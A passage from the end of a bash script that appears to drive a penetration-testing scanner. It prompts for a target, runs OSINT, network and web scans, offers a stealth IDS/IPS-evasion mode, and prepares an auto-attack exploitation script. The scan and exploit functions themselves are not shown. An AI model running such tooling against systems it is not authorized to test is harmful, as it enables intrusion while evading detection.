        "$HOME/.local/bin/html_generator.py"
        "./html_generator.py"
        "$(pwd)/html_generator.py"
    )

    for path in "${search_paths[@]}"; do
        if [ -f "$path" ]; then
            html_gen_script="$path"
            echo -e "${GREEN}[FOUND]${NC} HTML generator at: $html_gen_script"
            break
        fi
    done

    # Check if Python generator exists
    if [ -z "$html_gen_script" ] || [ ! -f "$html_gen_script" ]; then
        echo -e "${YELLOW}[WARN]${NC} HTML generator not found in any of these locations:"
        for path in "${search_paths[@]}"; do
            echo -e "${DIM}  - $path${NC}"
        done
        echo -e "${YELLOW}[INFO]${NC} Skipping HTML generation"
        return 1
    fi

    # Determine scan mode
    local scan_mode="Standard"
    [ "$QUICK_MODE" = true ] && scan_mode="Quick (3x faster)"
    [ "$STEALTH_MODE" = true ] && scan_mode="Stealth (IDS/IPS evasion)"
    [ "$AGGRESSIVE_MODE" = true ] && scan_mode="Aggressive (full coverage)"

    # Call Python generator - REMOVED 2>/dev/null to show errors
    echo -e "${CYAN}[INFO]${NC} Executing: python3 $html_gen_script $OUTDIR $TARGET ${URL:-NONE} ${DOMAIN:-NONE} \"$scan_mode\""
    python3 "$html_gen_script" "$OUTDIR" "$TARGET" "${URL:-NONE}" "${DOMAIN:-NONE}" "$scan_mode"
    local exit_code=$?

    if [ $exit_code -eq 0 ] && [ -f "$html" ] && [ -s "$html" ]; then
        local html_size=$(stat -c%s "$html" 2>/dev/null || echo "0")
        echo -e "${GREEN}[SUCCESS]${NC} HTML Report: ${WHITE}$html${NC} ${DIM}($html_size bytes)${NC}"
        echo -e "${GREEN}[INFO]${NC} Open in browser: ${WHITE}file://$(readlink -f "$html")${NC}"
        return 0
    else
        echo -e "${RED}[ERROR]${NC} HTML report generation failed (exit code: $exit_code)"
        [ ! -f "$html" ] && echo -e "${RED}[ERROR]${NC} Output file not created: $html"
        [ -f "$html" ] && [ ! -s "$html" ] && echo -e "${RED}[ERROR]${NC} Output file is empty: $html"
        return 1
    fi
}
main() {
    local AUTO_MODE=false
    
    while [[ $# -gt 0 ]]; do
        case $1 in
            -h|--help) show_help; exit 0 ;;
            -v|--version) echo "Security Scanner v$VERSION"; exit 0 ;;
            -q|--quick) QUICK_MODE=true; AUTO_MODE=true; shift ;;
            -s|--stealth) STEALTH_MODE=true; AUTO_MODE=true; shift ;;
            -a|--aggressive) AGGRESSIVE_MODE=true; AUTO_MODE=true; shift ;;
            *) echo "Unknown option: $1"; exit 1 ;;
        esac
    done
    
    trap 'handle_interrupt' SIGINT SIGTERM
    
    display_banner
    
    echo -e "${ORANGE}Target Configuration:${NC}"
    read -rp "$(echo -e ${WHITE}IP:${NC} )" TARGET
    [ -z "$TARGET" ] && { echo -e "${RED}[ERROR]${NC} IP required"; exit 1; }
    
    read -rp "$(echo -e ${WHITE}URL \(optional\):${NC} )" URL
    read -rp "$(echo -e ${WHITE}Domain \(optional\):${NC} )" DOMAIN
    
    [ -n "$URL" ] && [ -z "$DOMAIN" ] && DOMAIN=$(echo "$URL" | sed -E 's|https?://([^/]+).*|\1|')
    
    # Si un mode automatique est activé (-q, -s, -a), on lance directement le scan complet
    if [ "$AUTO_MODE" = true ]; then
        CHOICE=4
        echo -e "${GREEN}[AUTO]${NC} Automatic mode: Full Red Team assessment selected"
    else
        show_scan_menu
        read -rp "$(echo -e ${ORANGE}Select [1-4]:${NC} )" CHOICE
    fi
    
    prepare_output
    
    echo -e "\n${BRIGHT_RED}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BRIGHT_RED}║${NC}              ${ORANGE}ASSESSMENT STARTED${NC}                   ${BRIGHT_RED}║${NC}"
    echo -e "${BRIGHT_RED}╚════════════════════════════════════════════════════════════╝${NC}"
    echo -e "${DIM}Ctrl+C to stop gracefully${NC}"
    echo
    
    case "$CHOICE" in
        1) run_osint_scans "$TARGET" "$DOMAIN" ;;
        2) run_network_scans "$TARGET" ;;
        3)
            # Web scans - detect services if URL not provided
            if [ -z "$URL" ]; then
                echo -e "${YELLOW}[INFO]${NC} No URL provided, attempting auto-detection..."
                URL=$(detect_web_services "$TARGET")
            fi
            run_web_scans "$URL"
            ;;
        4)
            # Full assessment
            run_osint_scans "$TARGET" "$DOMAIN"
            [ "$SCAN_INTERRUPTED" = false ] && run_network_scans "$TARGET"

            # Auto-detect web services if URL not provided
            if [ "$SCAN_INTERRUPTED" = false ]; then
                if [ -z "$URL" ]; then
                    echo -e "${YELLOW}[INFO]${NC} No URL provided, attempting auto-detection..."
                    URL=$(detect_web_services "$TARGET")
                fi
                [ -n "$URL" ] && run_web_scans "$URL"
            fi

            [ "$SCAN_INTERRUPTED" = false ] && run_exploitation_prep "$TARGET"
            ;;
        *) echo -e "${RED}[ERROR]${NC} Invalid choice"; exit 1 ;;
    esac
    
    [ "$SCAN_INTERRUPTED" = true ] && exit 130
    
    generate_report
    
    echo -e "\n${BRIGHT_RED}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BRIGHT_RED}║${NC}              ${GREEN}COMPLETED${NC}                            ${BRIGHT_RED}║${NC}"
    echo -e "${BRIGHT_RED}╚════════════════════════════════════════════════════════════╝${NC}"
    echo
    echo -e "${ORANGE}Results:${NC} ${WHITE}$OUTDIR/${NC}"
    echo -e "${ORANGE}Report:${NC} ${WHITE}$OUTDIR/reports/summary_report.txt${NC}"
    echo -e "${ORANGE}Scripts:${NC} ${WHITE}$OUTDIR/exploit/auto_attack.sh${NC}"
    echo
    echo -e "${YELLOW}Use responsibly - Authorized testing only${NC}"
    echo
}

main "$@"